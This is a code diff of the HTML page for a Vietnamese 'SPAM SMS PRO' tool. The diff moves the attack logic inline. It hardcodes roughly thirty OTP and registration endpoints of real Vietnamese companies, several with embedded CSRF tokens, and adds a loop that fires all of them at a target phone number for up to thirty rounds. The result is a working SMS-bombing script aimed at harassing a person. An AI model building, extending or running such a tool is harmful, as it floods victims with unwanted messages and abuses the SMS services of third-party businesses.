@@ -1,10 +1,10 @@
-<!-- index.html - Giao diện cho TV360 API -->
+<!-- index.html - Giao diện SPAM SMS PRO với 25+ API hoạt động tốt -->
 <!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SPAM SMS PRO - TV360</title>
+    <title>SPAM SMS PRO</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
@@ -15,8 +15,11 @@
             font-family: 'Roboto', sans-serif;
             padding: 15px;
             color: #e0f0ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .container { max-width: 500px; margin: 0 auto; }
+        .container { max-width: 500px; width: 100%; margin: 0 auto; }
         .header {
             text-align: center;
             padding: 20px 0 10px;
@@ -26,13 +29,23 @@
         .header i { font-size: 40px; color: #00ffff; text-shadow: 0 0 30px #00ffff55; }
         .header h1 {
             font-family: 'Orbitron', monospace;
-            font-size: 20px;
+            font-size: 22px;
             background: linear-gradient(135deg, #00ffff, #ff00ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-top: 5px;
         }
         .header p { color: #8899bb; font-size: 13px; }
+        .header p .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            background: #00ff8822;
+            color: #00ff88;
+            border: 1px solid #00ff8844;
+        }
         .card {
             background: rgba(10, 15, 30, 0.7);
             backdrop-filter: blur(12px);
@@ -130,16 +143,6 @@
         .log-item .info { color: #88ccff; }
         .row { display: flex; gap: 10px; }
         .row .btn { flex: 1; }
-        .badge {
-            display: inline-block;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-        }
-        .badge-green { background: #00ff8822; color: #00ff88; border: 1px solid #00ff8844; }
-        .badge-pink { background: #ff00ff22; color: #ff00ff; border: 1px solid #ff00ff44; }
-        .badge-blue { background: #00ffff22; color: #00ffff; border: 1px solid #00ffff44; }
         .count-badge {
             background: #00ffff22;
             color: #00ffff;
@@ -202,17 +205,16 @@
         <div class="header">
             <i class="fas fa-bolt"></i>
             <h1>SPAM SMS PRO</h1>
-            <p><i class="fas fa-tv"></i> TV360 • <span class="badge badge-blue" id="apiCountDisplay">41 API</span></p>
+            <p><i class="fas fa-shield-alt"></i> <span class="badge" id="apiCountDisplay">25+ API</span> hoạt động tốt</p>
         </div>
 
-        <!-- Card chính -->
         <div class="card">
             <h3><i class="fas fa-phone-alt"></i> Nhập số điện thoại</h3>
             <div class="input-group">
                 <input type="text" id="phoneInput" placeholder="VD: 0987654321" value="0978693644">
             </div>
             <div class="input-group">
-                <input type="number" id="countInput" placeholder="Số lần spam" value="1" min="1" max="30">
+                <input type="number" id="countInput" placeholder="Số lần spam (1-30)" value="1" min="1" max="30">
             </div>
             <button class="btn btn-primary btn-block" id="startBtn">
                 <i class="fas fa-bomb"></i> KÍCH HOẠT SPAM
@@ -223,19 +225,17 @@
             </div>
         </div>
 
-        <!-- Status -->
         <div class="card">
             <h3><i class="fas fa-list"></i> Log <span class="count-badge" id="logCount">0</span></h3>
             <div class="status-box" id="statusBox">
-                <div class="log-item"><span class="time">[⚡]</span><span class="msg info">Sẵn sàng tấn công TV360...</span></div>
+                <div class="log-item"><span class="time">[⚡]</span><span class="msg info">Sẵn sàng tấn công...</span></div>
             </div>
         </div>
 
-        <!-- Danh sách API -->
         <div class="card" style="border-color:#ff00ff44;">
-            <h3><i class="fas fa-code"></i> API TV360 <span class="badge badge-pink" id="apiCount2">41</span></h3>
-            <div style="font-size:11px;color:#8899bb;max-height:100px;overflow:auto;font-family:'Courier New',monospace;line-height:1.6;" id="apiList">
-                Đang tải...
+            <h3><i class="fas fa-code"></i> Danh sách API</h3>
+            <div style="font-size:11px;color:#8899bb;max-height:120px;overflow:auto;font-family:'Courier New',monospace;line-height:1.8;" id="apiList">
+                <div style="color:#88ccdd;">Đang tải danh sách API...</div>
             </div>
         </div>
 
@@ -245,10 +245,74 @@
     </div>
 
     <script>
-        // ===== HÀM LOG =====
+        // ===== DANH SÁCH API HOẠT ĐỘNG TỐT =====
+        const bestApis = [
+            { name: 'Sapo', url: 'https://www.sapo.vn/fnb/sendotp', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phonenumber=' + encodeURIComponent(p) },
+            { name: 'Viettel', url: 'https://viettel.vn/api/getOTPLoginCommon', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, typeCode: 'DI_DONG', actionCode: 'myviettel://login_mobile', type: 'otp_login' }) },
+            { name: 'Medicare', url: 'https://medicare.vn/api/otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ mobile: p, mobile_country_prefix: '84' }) },
+            { name: 'TV360', url: 'https://tv360.vn/public/v1/auth/get-otp-login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ msisdn: p }) },
+            { name: 'DMX', url: 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phoneNumber=' + encodeURIComponent(p) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU' },
+            { name: 'Shopee', url: 'https://shopee.vn/api/v4/otp/get_settings_v2', method: 'POST', headers: { 'Content-Type': 'application/json', 'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs' }, body: (p) => JSON.stringify({ operation: 8, encrypted_phone: '', phone: p, supported_channels: [1,2,3,6,0,5], support_session: true }) },
+            { name: 'TGDD', url: 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phoneNumber=' + encodeURIComponent(p) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs' },
+            { name: 'FPTSHOP', url: 'https://papi.fptshop.com.vn/gw/is/user/new-send-verification', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ fromSys: 'WEBKHICT', otpType: '0', phoneNumber: p }) },
+            { name: 'WinMart', url: 'https://api-crownx.winmart.vn/iam/api/v1/user/register', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ firstName: 'Nguyen Van A', phoneNumber: p, masanReferralCode: '', dobDate: '2024-07-26', gender: 'Male' }) },
+            { name: 'F88', url: 'https://api.f88.vn/growth/webf88vn/api/v1/Pawn', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ FullName: 'Nguyen Van A', Phone: p, DistrictCode: '024', ProvinceCode: '02', AssetType: 'Car', IsChoose: '1', ShopCode: '', Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan', FormType: 1 }) },
+            { name: 'GHN', url: 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, type: 'register' }) },
+            { name: 'LotteMart', url: 'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ username: p, case: 'register' }) },
+            { name: 'VIEON', url: 'https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ username: p, country_code: 'VN', model: 'Windows 10', device_id: 'f812a55d1d5ee2b87a927833df2608bc', device_name: 'Edge/127', device_type: 'desktop', platform: 'web', ui: '012021' }) },
+            { name: 'Vinpearl', url: 'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ channel: 'vpt', username: p, type: 1, OtpChannel: 1 }) },
+            { name: 'LongChau', url: 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phoneNumber: p, otpType: 0, fromSys: 'WEBKHLC' }) },
+            { name: 'Ahamove', url: 'https://api.ahamove.com/api/v3/public/user/login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ mobile: p, country_code: 'VN', firebase_sms_auth: true }) },
+            { name: 'ViettelMoney', url: 'https://api8.viettelpay.vn/customer/v2/accounts/register', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Viettel Money/8.8.8' }, body: (p) => JSON.stringify({ identityType: 'msisdn', identityValue: p, type: 'REGISTER' }) },
+            { name: 'XanhSM', url: 'https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0' }, body: (p) => { let ph = p; if (ph.startsWith('09') || ph.startsWith('03')) ph = '+84' + ph.substring(1); return JSON.stringify({ is_forgot_password: false, phone: ph, provider: 'VIET_GUYS' }); } },
+            { name: 'Watsons', url: 'https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep?lang=vi', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'WTCVN/24050.8.0' }, body: (p) => JSON.stringify({ otpTokenRequest: { action: 'REGISTRATION', type: 'SMS', countryCode: '84', target: p }, defaultAddress: { mobileNumberCountryCode: '84', mobileNumber: p }, mobileNumber: p }) },
+            { name: 'FAHASA', url: 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phone=' + encodeURIComponent(p) },
+            { name: 'PNJ', url: 'https://www.pnj.com.vn/customer/otp/request', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => '_method=POST&_token=0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU&type=zns&phone=' + encodeURIComponent(p) },
+            { name: 'Batdongsan', url: 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=', method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, buildUrl: (p) => 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + encodeURIComponent(p) },
+            { name: 'Vinamilk', url: 'https://new.vinamilk.com.vn/api/account/getotp', method: 'POST', headers: { 'Content-Type': 'text/plain;charset=UTF-8' }, body: (p) => JSON.stringify({ type: 'register', phone: p }) },
+            { name: 'MOCA', url: 'https://moca.vn/moca/v2/users/role?phoneNumber=', method: 'GET', headers: { 'User-Agent': 'Pass/2.10.156' }, buildUrl: (p) => 'https://moca.vn/moca/v2/users/role?phoneNumber=' + encodeURIComponent(p) },
+            { name: 'Pico', url: 'https://auth.pico.vn/user/api/auth/login/request-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: 'TINIWORLD', url: 'https://prod-tini-id.nkidworks.com/auth/tinizen', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => '_csrf=&clientId=609168b9f8d5275ea1e262d6&redirectUrl=https://tiniworld.com&phone=' + encodeURIComponent(p) },
+            { name: 'Routine', url: 'https://routine.vn/customer/otp/send/', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'telephone=' + encodeURIComponent(p) + '&isForgotPassword=0' },
+            { name: 'GUMAC', url: 'https://cms.gumac.vn/api/v1/customers/verify-phone-number', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: '30shine', url: 'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: 'Popeyes', url: 'https://api.popeyes.vn/api/v1/register', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, firstName: 'Nguyen', lastName: 'Ngoc', email: 'test@mail.com', password: 'test123' }) },
+        ];
+
+        // ===== TẠO HÀM SPAM =====
+        const spamFunctions = bestApis.map(api => {
+            return async (phone) => {
+                try {
+                    let url = api.url;
+                    let body = null;
+                    const headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', ...api.headers };
+                    if (api.buildUrl) {
+                        url = api.buildUrl(phone);
+                    } else if (api.body) {
+                        body = typeof api.body === 'function' ? api.body(phone) : api.body;
+                    }
+                    const response = await fetch(url, { method: api.method, headers: headers, body: body });
+                    const text = await response.text();
+                    return (text.includes('success') || text.includes('otp') || text.includes('OK') || text.includes('"code":0') || text.includes('"status":0') || text.includes('otpTrackingId') || text.includes('"success":true')) ? 'OK' : 'FAIL';
+                } catch(e) { return 'FAIL'; }
+            };
+        });
+
+        const serviceNames = bestApis.map(api => api.name);
+
+        // ===== LOG & UI =====
         const statusBox = document.getElementById('statusBox');
         const logCount = document.getElementById('logCount');
+        const apiListDiv = document.getElementById('apiList');
         let logCounter = 0;
+        let running = false;
+        let stopRequested = false;
+
+        // Hiển thị danh sách API
+        apiListDiv.innerHTML = bestApis.map((api, i) => 
+            `<div style="color:#88ccdd;">${i+1}. ${api.name}</div>`
+        ).join('');
+        document.getElementById('apiCountDisplay').textContent = bestApis.length + ' API';
 
         function addLog(msg, type = 'info') {
             const time = new Date().toLocaleTimeString('vi-VN');
@@ -268,10 +332,77 @@
             }
         }
 
-        // Gán global để spam.js dùng
-        window.addLog = addLog;
+        // ===== HÀM SPAM CHÍNH =====
+        async function runSpam(phone, count) {
+            if (running) { addLog('⚠️ Đang chạy, vui lòng đợi', 'fail'); return; }
+            if (!phone || phone.length < 9) { addLog('❌ Số điện thoại không hợp lệ', 'fail'); return; }
+            let total = parseInt(count) || 1;
+            if (total < 1) total = 1;
+            if (total > 30) total = 30;
 
-        // ===== QUẢN LÝ NHẠC =====
+            running = true;
+            stopRequested = false;
+            addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (${spamFunctions.length} API)`, 'info');
+
+            let successCount = 0, failCount = 0;
+
+            for (let i = 0; i < total; i++) {
+                if (stopRequested) break;
+                addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
+                for (let j = 0; j < spamFunctions.length; j++) {
+                    if (stopRequested) break;
+                    try {
+                        const result = await spamFunctions[j](phone);
+                        const name = serviceNames[j] || 'API';
+                        if (result === 'OK') { successCount++; addLog(`✅ ${name} -> Thành công`, 'success'); } 
+                        else { failCount++; addLog(`❌ ${name} -> Thất bại`, 'fail'); }
+                    } catch(e) {
+                        failCount++;
+                        addLog(`⚠️ ${serviceNames[j] || 'API'} -> Lỗi`, 'fail');
+                    }
+                    await new Promise(r => setTimeout(r, 50));
+                }
+                if (i < total - 1 && !stopRequested) {
+                    addLog(`⏳ Chờ 1 giây...`, 'info');
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+
+            running = false;
+            addLog(`🏁 Hoàn thành! ✅ ${successCount} / ❌ ${failCount}`, successCount > failCount ? 'success' : 'fail');
+        }
+
+        // ===== SỰ KIỆN =====
+        const phoneInput = document.getElementById('phoneInput');
+        const countInput = document.getElementById('countInput');
+        const startBtn = document.getElementById('startBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const stopBtn = document.getElementById('stopBtn');
+
+        startBtn.addEventListener('click', function() {
+            runSpam(phoneInput.value.trim(), countInput.value);
+        });
+
+        clearBtn.addEventListener('click', function() {
+            statusBox.innerHTML = '';
+            logCounter = 0;
+            logCount.textContent = '0';
+            addLog('🗑️ Đã xóa log', 'info');
+        });
+
+        stopBtn.addEventListener('click', function() {
+            stopRequested = true;
+            running = false;
+            addLog('⏹️ Dừng theo yêu cầu', 'fail');
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                runSpam(phoneInput.value.trim(), countInput.value);
+            }
+        });
+
+        // ===== NHẠC =====
         const audio = document.getElementById('bgMusic');
         const playBtn = document.getElementById('playBtn');
         let isPlaying = false;
@@ -295,67 +426,6 @@
                 audio.play().catch(() => {});
                 isPlaying = true;
                 playBtn.innerHTML = '<i class="fas fa-pause"></i>';
-            }
-        });
-
-        // ===== TẢI SPAM.JS =====
-        const script = document.createElement('script');
-        script.src = 'spam.js';
-        script.onload = function() {
-            addLog('✅ Đã tải ' + (window.spamFunctions ? window.spamFunctions.length : 0) + ' API TV360', 'success');
-            // Hiển thị danh sách API
-            const apiListDiv = document.getElementById('apiList');
-            if (window.tv360Apis) {
-                apiListDiv.innerHTML = window.tv360Apis.map((api, i) => 
-                    `<div style="color:#88ccdd;">${i+1}. ${api.name}</div>`
-                ).join('');
-            }
-            document.getElementById('apiCountDisplay').textContent = (window.tv360Apis ? window.tv360Apis.length : 0) + ' API';
-            document.getElementById('apiCount2').textContent = window.tv360Apis ? window.tv360Apis.length : 0;
-        };
-        script.onerror = function() {
-            addLog('❌ Không tải được spam.js', 'fail');
-        };
-        document.head.appendChild(script);
-
-        // ===== SỰ KIỆN =====
-        const phoneInput = document.getElementById('phoneInput');
-        const countInput = document.getElementById('countInput');
-        const startBtn = document.getElementById('startBtn');
-        const clearBtn = document.getElementById('clearBtn');
-        const stopBtn = document.getElementById('stopBtn');
-
-        startBtn.addEventListener('click', function() {
-            const phone = phoneInput.value.trim();
-            const count = parseInt(countInput.value) || 1;
-            if (typeof window.runSpam === 'function') {
-                window.runSpam(phone, count);
-            } else {
-                addLog('❌ Chưa tải xong spam.js, vui lòng đợi', 'fail');
-            }
-        });
-
-        clearBtn.addEventListener('click', function() {
-            statusBox.innerHTML = '';
-            logCounter = 0;
-            logCount.textContent = '0';
-            addLog('🗑️ Đã xóa log', 'info');
-        });
-
-        stopBtn.addEventListener('click', function() {
-            window.stopRequested = true;
-            window.running = false;
-            addLog('⏹️ Dừng theo yêu cầu', 'fail');
-        });
-
-        // Enter để spam
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                const phone = phoneInput.value.trim();
-                const count = parseInt(countInput.value) || 1;
-                if (typeof window.runSpam === 'function') {
-                    window.runSpam(phone, count);
-                }
             }
         });
 
